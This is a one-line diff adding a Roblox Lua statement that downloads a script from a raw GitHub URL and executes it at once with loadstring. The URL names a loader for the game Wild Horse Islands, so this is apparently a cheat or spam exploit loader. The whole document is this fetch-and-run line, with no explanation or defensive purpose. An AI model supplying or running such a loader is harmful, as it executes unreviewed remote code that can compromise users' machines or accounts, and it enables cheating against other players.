@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/wild-horse-islands-spam0-ng1n3w9rh0u5fn.lua"))()
